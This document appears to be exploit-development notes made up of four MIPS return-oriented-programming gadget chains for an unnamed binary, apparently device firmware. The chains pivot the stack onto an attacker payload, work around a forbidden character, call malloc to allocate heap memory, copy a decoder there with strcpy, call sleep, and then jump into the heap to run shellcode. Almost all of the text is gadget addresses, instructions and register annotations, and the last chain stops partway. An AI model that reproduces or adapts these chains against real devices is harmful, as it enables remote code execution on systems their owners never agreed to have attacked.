# CHAIN 1

```
ROP 1 0x452C8
0x000452c8: lw $ra, 0x34($sp)       // ROP2
0x000452cc: lw $s6, 0x30($sp)
0x000452d0: lw $s5, 0x2c($sp)       // ROP3
0x000452d4: lw $s4, 0x28($sp)
0x000452d8: lw $s3, 0x24($sp)       // 0xe971e153
0x000452dc: lw $s2, 0x20($sp)       // 0x41417565
0x000452e0: lw $s1, 0x1c($sp)       // 0x4185312d
0x000452e4: lw $s0, 0x18($sp)
0x000452e8: jr $ra
0x000452ec: addiu $sp, $sp, 0x38

ROP 2 0x44E3C
0x00044e3c: move $t9, $s5           // ROP 3
0x00044e40: move $a2, $s2
0x00044e44: subu $s1, $s1, $s2      // s1 - s2 = (0x43bbe8-0x20)
0x00044e48: jalr $t9
0x00044e4c: addu $s3, $s3, $s2      // 0xe971e153+0x41417565=0x12ab356b8 = ROP5

ROP 3 0x3CB68
0x0003cb68: lw $v0, 0x20($s1)       // get ptr to payload start
0x0003cb6c: lw $t9, 0x10($v0)       // v0 points to begin of our payload
0x0003cb70: jalr $t9
0x0003cb74: move $a0, $s1

# ROP 4 0x27938
# move ptr to fp
0x00027938: move $fp, $v0           // move payload ptr to fp
0x0002793c: lw $a0, ($s1)           // access into code we dont care but s1 must be valid
0x00027940: move $t9, $s3           // ROP 5
0x00027944: jalr $t9
0x00027948: nop

# ROP 5 0x556B8
# Write FP to SP, exec continues on new stack
0x000556b8: move $sp, $fp           // finally, sp is at start of payload
0x000556bc: lw $ra, 0x24($sp)       // load next ROP Gadget to continue chain
0x000556c0: lw $fp, 0x20($sp)       // dont care
0x000556c4: jr $ra
0x000556c8: addiu $sp, $sp, 0x28
```


# CHAIN 2 

```
# increase stack pointer to get to the real payload without "_"
# increase by 0x1e0*2+0x38=1016
ROP1
0x00046dc8: lw $ra, 0x1dc($sp)      // ROP2
0x00046dcc: lw $s0, 0x1d8($sp)
0x00046dd0: jr $ra
0x00046dd4: addiu $sp, $sp, 0x1e0

ROP2
0x000452c8: lw $ra, 0x34($sp)       // ROP3
0x000452cc: lw $s6, 0x30($sp)
0x000452d0: lw $s5, 0x2c($sp)
0x000452d4: lw $s4, 0x28($sp)
0x000452d8: lw $s3, 0x24($sp)
0x000452dc: lw $s2, 0x20($sp)
0x000452e0: lw $s1, 0x1c($sp)       // 0x88888888
0x000452e4: lw $s0, 0x18($sp)
0x000452e8: jr $ra
0x000452ec: addiu $sp, $sp, 0x38

ROP 3
0x00046dc8: lw $ra, 0x1dc($sp)      // CHAIN3 ROP2
0x00046dcc: lw $s0, 0x1d8($sp)      // 0x8799764c
0x00046dd0: jr $ra
0x00046dd4: addiu $sp, $sp, 0x1e0
```

# CHAIN 3

```
ROP2
0x000342b0: 
addu $v0, $s1, $s0;     // such that v0 = 0x1021fed4 = jump op code 
lw $ra, 0x24($sp);      // ROP 3
lw $s1, 0x20($sp); 
lw $s0, 0x1c($sp);      // ROP 4
jr $ra; 
addiu $sp, $sp, 0x28;

ROP3
0x00017db0: 
move $t9, $s0; 
jalr $t9; 
move $a0, $v0;

ROP4
0x00053cf8: addiu $a1, $sp, 0x18    // GET SP
0x00053cfc: lw $ra, 0x24($sp)       // ROP 5
0x00053d00: jr $ra
0x00053d04: addiu $sp, $sp, 0x28

ROP5
0x0003b5d4: lw $ra, 0x3c($sp)   // ROP 5.1
0x0003b5d8: lw $s7, 0x38($sp)   // ROP 6
0x0003b5dc: lw $s6, 0x34($sp)
0x0003b5e0: lw $s5, 0x30($sp)   //CHAIN3_VAR1
0x0003b5e4: lw $s4, 0x2c($sp)
0x0003b5e8: lw $s3, 0x28($sp)
0x0003b5ec: lw $s2, 0x24($sp)
0x0003b5f0: lw $s1, 0x20($sp)
0x0003b5f4: lw $s0, 0x1c($sp)   //CHAIN3_VAR2
0x0003b5f8: jr $ra
0x0003b5fc: addiu $sp, $sp, 0x40

ROP5.1
0x0005733c: addu $a1, $a1, $s5
0x00057340: move $t9, $s7
0x00057344: jalr $t9
0x00057348: subu $a1, $a1, $s0;

ROP6
0x00019c50: lw $ra, 0x2c($sp)         // ROP 7
0x00019c54: lw $s4, 0x28($sp)
0x00019c58: lw $s3, 0x24($sp)         // ROP 8
0x00019c5c: lw $s2, 0x20($sp)
0x00019c60: lw $s1, 0x1c($sp)
0x00019c64: lw $s0, 0x18($sp)
0x00019c68: jr $ra
0x00019c6c: addiu $sp, $sp, 0x30

ROP7
0x0005219c: move $s1, $a1              // Move SP to s1
0x000521a0: move $s2, $a2
0x000521a4: move $t9, $s3
0x000521a8: move $fp, $a3
0x000521ac: jalr $t9
0x000521b0: move $s6, $a0

ROP8
0x00043a70: sw $a0, ($s1)              // STORE JUMP COMMAND
0x00043a74: b 0x43a80
0x00043a80: lw $ra, 0x2c($sp)          // ROP 9
0x00043a84: move $v0, $v1
0x00043a88: lw $s1, 0x28($sp)           //VAL1 for malloc rop
0x00043a8c: lw $s0, 0x24($sp)           //VAL2 for malloc rop
0x00043a90: jr $ra
0x00043a94: addiu $sp, $sp, 0x30
```

Exploit is prepared now.
Use malloc to allocate memory.
Then use strncpy to copy decoder into the heap.
Next jump on the heap.

Task of this chain:
1. allocate memory using malloc. result of malloc is stored in v0 
2. get ptr to start of decoder
3. strcpy decoder to heap ptr
4. sleep
5. set PC to heap <- actually the hardest part

# CHAIN 4

```
ROP_MALLOC1
0x000342b0: 
addu $v0, $s1, $s0;     // v0 = size of malloc
lw $ra, 0x24($sp);      // ROP_mALLOC2
lw $s1, 0x20($sp);      // ROP_MALLOC3
lw $s0, 0x1c($sp);      // MALLOC
jr $ra; 
addiu $sp, $sp, 0x28;

ROP_MALLOC2
0x00035a4c: move $a0, $v0           // malloc size
0x00035a50: move $t9, $s1           // ROP_MALLOC3
0x00035a54: jalr $t9
0x00035a58: nop

ROP_MALLOC3
0x0003c340: move $t9, $s0           // malloc
0x0003c344: lw $ra, 0x24($sp)       // ROP_MALLOC3_1
0x0003c348: lw $s2, 0x20($sp)        
0x0003c34c: lw $s1, 0x1c($sp)       
0x0003c350: lw $s0, 0x18($sp)
0x0003c354: jr $t9                  // malloc()
0x0003c358: addiu $sp, $sp, 0x28

ROP_MALLOC4 save malloc return address somehow, because we need to get dst for strncpy next
0x00014f84: 
move $a3, $v0; 
lw $ra, 0x24($sp); // ROP_STRCPY1
jr $ra; addiu 
$sp, $sp, 0x28;

# strncpy does not use any s0-s7 register. thus our saved heap ptr is safe!

ROP_STRNCPY1
0x00053cf8: addiu $a1, $sp, 0x18    // GET SP
0x00053cfc: lw $ra, 0x24($sp)       // ROP 5
0x00053d00: jr $ra
0x00053d04: addiu $sp, $sp, 0x28

ROP_STRCPY1_1
0x0003b5d4: lw $ra, 0x3c($sp)   // ROP_STRCPY2
0x0003b5d8: lw $s7, 0x38($sp)   // ROP_STRCPY3
0x0003b5dc: lw $s6, 0x34($sp)
0x0003b5e0: lw $s5, 0x30($sp)   //VAR1
0x0003b5e4: lw $s4, 0x2c($sp)
0x0003b5e8: lw $s3, 0x28($sp)   // ROP_SLEEP1
0x0003b5ec: lw $s2, 0x24($sp)
0x0003b5f0: lw $s1, 0x20($sp)
0x0003b5f4: lw $s0, 0x1c($sp)   //VAR2
0x0003b5f8: jr $ra
0x0003b5fc: addiu $sp, $sp, 0x40

ROP_STRNCPY2
0x0005733c: addu $a1, $a1, $s5
0x00057340: move $t9, $s7
0x00057344: jalr $t9
0x00057348: subu $a1, $a1, $s0;     // a1 now points to the decoder

ROP_STRCPY3
0x000342b4: lw $ra, 0x24($sp)       // ROP_STRCPY3_1
0x000342b8: lw $s1, 0x20($sp)       // ROP_STRCPY4
0x000342bc: lw $s0, 0x1c($sp)       // strcpy()
0x000342c0: jr $ra
0x000342c4: addiu $sp, $sp, 0x28;

ROP_STRCPY3_1
0x00035a4c: move $a0, $v0           // malloc size
0x00035a50: move $t9, $s1           // ROP_MALLOC3
0x00035a54: jalr $t9
0x00035a58: nop

ROP_STRCPY4
0x0003c340: move $t9, $s0           // strcpy()
0x0003c344: lw $ra, 0x24($sp)       // ROP_STRCPY5
0x0003c348: lw $s2, 0x20($sp)       
0x0003c34c: lw $s1, 0x1c($sp)       
0x0003c350: lw $s0, 0x18($sp)
0x0003c354: jr $t9                  // strcpy()
0x0003c358: addiu $sp, $sp, 0x28

ROP_STRCPY5
0x0002b17c: 
move $s7, $v0; # safe heap ptr; s7 seems to not change at all
move $t9, $s3;                       // ROP_SLEEP1 
jalr $t9; 
move $a0, $s4;

# now move heap ptr into ra and call sleep(1)
# cp a3 to s0, because s0 remains untouched when calling sleep
# next call sleep
# set RA to procedure that moves s0 to t9 and jalr t9. exit

ROP_SLEEP1
0x00019c50: lw $ra, 0x2c($sp)           // ROP_SLEEP2
0x00019c54: lw $s4, 0x28($sp)          
0x00019c58: lw $s3, 0x24($sp)           // ROP_SLEEP3
0x00019c5c: lw $s2, 0x20($sp)
0x00019c60: lw $s1, 0x1c($sp)           // Sleep()  
0x00019c64: lw $s0, 0x18($sp)
0x00019c68: jr $ra
0x00019c6c: addiu $sp, $sp, 0x30

ROP_SLEEP2
0x00058044: addiu $a0, $zero, 1         // 1 Second sleep
0x00058048: move $t9, $s3
0x0005804c: jalr $t9
0x00058050: ori $a1, $s5, 2

ROP_SLEEP3
0x00043f48: move $t9, $s1               // sleep
0x00043f4c: lw $ra, 0x34($sp)           // ROP_JMP_HEAP1    
0x00043f50: lw $s3, 0x30($sp)           
0x00043f54: lw $s2, 0x2c($sp)          
0x00043f58: lw $s1, 0x28($sp)           // SLEEP
0x00043f5c: lw $s0, 0x24($sp)
0x00043f60: jr $t9
0x00043f64: addiu $sp, $sp, 0x38

# a3 still holds our heap ptr. next we have to move a3 into sx and jump to sx
ROP_JMP_HEAP1
0x00057340: move $t9, $s7
0x00057344: jalr $t9
```